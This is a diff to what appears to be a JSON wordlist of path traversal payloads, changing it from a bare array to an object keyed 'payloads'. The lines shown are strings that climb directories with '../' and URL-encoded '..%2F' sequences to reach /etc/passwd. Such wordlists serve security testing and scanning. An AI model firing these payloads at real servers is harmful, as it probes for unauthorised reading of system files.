@@ -1,4 +1,4 @@
-[
+{"payloads":[
 "./etc/passwd",
 "../etc/passwd",
 "../../etc/passwd",
@@ -37,4 +37,4 @@
 "..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc/passwd",
 "..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc/passwd",
 "..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc/passwd"
-]
+]}
